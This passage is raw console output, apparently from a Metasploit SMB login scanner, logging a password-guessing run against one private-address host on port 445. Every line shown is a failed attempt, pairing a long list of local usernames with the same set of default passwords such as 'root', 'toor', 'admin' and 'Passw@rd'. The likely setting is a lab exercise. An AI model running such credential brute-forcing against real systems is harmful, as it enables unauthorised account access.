[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gabrielall:qwerty',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gabrielall:webadmin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gabrielall:webmaster',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gabrielall:maintenance',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gabrielall:techsupport',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gabrielall:letmein',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gabrielall:logon',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gabrielall:Passw@rd',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gabrielall:alpine',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gertrudewil:root',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gertrudewil:toor',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gertrudewil:raspberry',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gertrudewil:dietpi',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gertrudewil:test',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gertrudewil:uploader',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gertrudewil:password',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gertrudewil:admin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gertrudewil:administrator',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gertrudewil:marketing',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gertrudewil:12345678',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gertrudewil:1234',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gertrudewil:12345',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gertrudewil:qwerty',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gertrudewil:webadmin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gertrudewil:webmaster',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gertrudewil:maintenance',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gertrudewil:techsupport',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gertrudewil:letmein',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gertrudewil:logon',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gertrudewil:Passw@rd',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gertrudewil:alpine',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gilberttay:root',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gilberttay:toor',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gilberttay:raspberry',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gilberttay:dietpi',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gilberttay:test',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gilberttay:uploader',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gilberttay:password',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gilberttay:admin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gilberttay:administrator',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gilberttay:marketing',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gilberttay:12345678',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gilberttay:1234',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gilberttay:12345',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gilberttay:qwerty',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gilberttay:webadmin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gilberttay:webmaster',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gilberttay:maintenance',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gilberttay:techsupport',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gilberttay:letmein',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gilberttay:logon',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gilberttay:Passw@rd',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gilberttay:alpine',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\glendasny:root',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\glendasny:toor',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\glendasny:raspberry',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\glendasny:dietpi',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\glendasny:test',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\glendasny:uploader',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\glendasny:password',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\glendasny:admin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\glendasny:administrator',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\glendasny:marketing',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\glendasny:12345678',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\glendasny:1234',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\glendasny:12345',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\glendasny:qwerty',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\glendasny:webadmin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\glendasny:webmaster',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\glendasny:maintenance',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\glendasny:techsupport',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\glendasny:letmein',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\glendasny:logon',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\glendasny:Passw@rd',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\glendasny:alpine',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gordonban:root',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gordonban:toor',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gordonban:raspberry',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gordonban:dietpi',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gordonban:test',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gordonban:uploader',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gordonban:password',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gordonban:admin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gordonban:administrator',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gordonban:marketing',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gordonban:12345678',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gordonban:1234',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gordonban:12345',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gordonban:qwerty',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gordonban:webadmin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gordonban:webmaster',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gordonban:maintenance',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gordonban:techsupport',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gordonban:letmein',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gordonban:logon',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gordonban:Passw@rd',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\gordonban:alpine',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\harveyrey:root',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\harveyrey:toor',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\harveyrey:raspberry',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\harveyrey:dietpi',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\harveyrey:test',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\harveyrey:uploader',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\harveyrey:password',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\harveyrey:admin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\harveyrey:administrator',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\harveyrey:marketing',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\harveyrey:12345678',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\harveyrey:1234',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\harveyrey:12345',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\harveyrey:qwerty',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\harveyrey:webadmin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\harveyrey:webmaster',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\harveyrey:maintenance',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\harveyrey:techsupport',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\harveyrey:letmein',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\harveyrey:logon',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\harveyrey:Passw@rd',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\harveyrey:alpine',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\heidiwat:root',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\heidiwat:toor',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\heidiwat:raspberry',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\heidiwat:dietpi',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\heidiwat:test',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\heidiwat:uploader',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\heidiwat:password',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\heidiwat:admin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\heidiwat:administrator',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\heidiwat:marketing',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\heidiwat:12345678',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\heidiwat:1234',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\heidiwat:12345',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\heidiwat:qwerty',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\heidiwat:webadmin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\heidiwat:webmaster',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\heidiwat:maintenance',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\heidiwat:techsupport',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\heidiwat:letmein',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\heidiwat:logon',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\heidiwat:Passw@rd',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\heidiwat:alpine',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\herminiacol:root',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\herminiacol:toor',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\herminiacol:raspberry',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\herminiacol:dietpi',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\herminiacol:test',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\herminiacol:uploader',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\herminiacol:password',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\herminiacol:admin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\herminiacol:administrator',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\herminiacol:marketing',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\herminiacol:12345678',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\herminiacol:1234',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\herminiacol:12345',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\herminiacol:qwerty',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\herminiacol:webadmin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\herminiacol:webmaster',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\herminiacol:maintenance',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\herminiacol:techsupport',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\herminiacol:letmein',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\herminiacol:logon',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\herminiacol:Passw@rd',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\herminiacol:alpine',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\hollywel:root',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\hollywel:toor',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\hollywel:raspberry',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\hollywel:dietpi',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\hollywel:test',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\hollywel:uploader',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\hollywel:password',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\hollywel:admin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\hollywel:administrator',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\hollywel:marketing',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\hollywel:12345678',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\hollywel:1234',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\hollywel:12345',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\hollywel:qwerty',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\hollywel:webadmin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\hollywel:webmaster',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\hollywel:maintenance',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\hollywel:techsupport',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\hollywel:letmein',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\hollywel:logon',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\hollywel:Passw@rd',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\hollywel:alpine',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\hughfos:root',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\hughfos:toor',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\hughfos:raspberry',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\hughfos:dietpi',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\hughfos:test',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\hughfos:uploader',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\hughfos:password',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\hughfos:admin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\hughfos:administrator',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\hughfos:marketing',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\hughfos:12345678',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\hughfos:1234',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\hughfos:12345',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\hughfos:qwerty',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\hughfos:webadmin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\hughfos:webmaster',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\hughfos:maintenance',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\hughfos:techsupport',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\hughfos:letmein',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\hughfos:logon',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\hughfos:Passw@rd',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\hughfos:alpine',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ivanray:root',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ivanray:toor',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ivanray:raspberry',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ivanray:dietpi',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ivanray:test',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ivanray:uploader',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ivanray:password',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ivanray:admin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ivanray:administrator',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ivanray:marketing',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ivanray:12345678',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ivanray:1234',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ivanray:12345',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ivanray:qwerty',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ivanray:webadmin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ivanray:webmaster',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ivanray:maintenance',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ivanray:techsupport',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ivanray:letmein',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ivanray:logon',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ivanray:Passw@rd',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\ivanray:alpine',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jamiegra:root',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jamiegra:toor',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jamiegra:raspberry',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jamiegra:dietpi',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jamiegra:test',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jamiegra:uploader',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jamiegra:password',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jamiegra:admin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jamiegra:administrator',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jamiegra:marketing',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jamiegra:12345678',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jamiegra:1234',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jamiegra:12345',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jamiegra:qwerty',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jamiegra:webadmin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jamiegra:webmaster',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jamiegra:maintenance',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jamiegra:techsupport',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jamiegra:letmein',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jamiegra:logon',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jamiegra:Passw@rd',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jamiegra:alpine',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\janicekim:root',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\janicekim:toor',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\janicekim:raspberry',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\janicekim:dietpi',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\janicekim:test',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\janicekim:uploader',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\janicekim:password',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\janicekim:admin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\janicekim:administrator',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\janicekim:marketing',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\janicekim:12345678',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\janicekim:1234',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\janicekim:12345',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\janicekim:qwerty',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\janicekim:webadmin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\janicekim:webmaster',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\janicekim:maintenance',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\janicekim:techsupport',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\janicekim:letmein',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\janicekim:logon',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\janicekim:Passw@rd',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\janicekim:alpine',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jasonper:root',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jasonper:toor',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jasonper:raspberry',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jasonper:dietpi',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jasonper:test',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jasonper:uploader',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jasonper:password',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jasonper:admin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jasonper:administrator',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jasonper:marketing',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jasonper:12345678',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jasonper:1234',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jasonper:12345',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jasonper:qwerty',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jasonper:webadmin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jasonper:webmaster',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jasonper:maintenance',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jasonper:techsupport',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jasonper:letmein',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jasonper:logon',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jasonper:Passw@rd',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jasonper:alpine',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jaydenhun:root',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jaydenhun:toor',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jaydenhun:raspberry',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jaydenhun:dietpi',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jaydenhun:test',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jaydenhun:uploader',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jaydenhun:password',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jaydenhun:admin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jaydenhun:administrator',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jaydenhun:marketing',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jaydenhun:12345678',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jaydenhun:1234',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jaydenhun:12345',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jaydenhun:qwerty',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jaydenhun:webadmin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jaydenhun:webmaster',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jaydenhun:maintenance',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jaydenhun:techsupport',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jaydenhun:letmein',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jaydenhun:logon',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jaydenhun:Passw@rd',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jaydenhun:alpine',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jillbec:root',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jillbec:toor',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jillbec:raspberry',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jillbec:dietpi',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jillbec:test',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jillbec:uploader',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jillbec:password',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jillbec:admin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jillbec:administrator',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jillbec:marketing',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jillbec:12345678',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jillbec:1234',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jillbec:12345',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jillbec:qwerty',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jillbec:webadmin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jillbec:webmaster',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jillbec:maintenance',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jillbec:techsupport',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\jillbec:letmein',
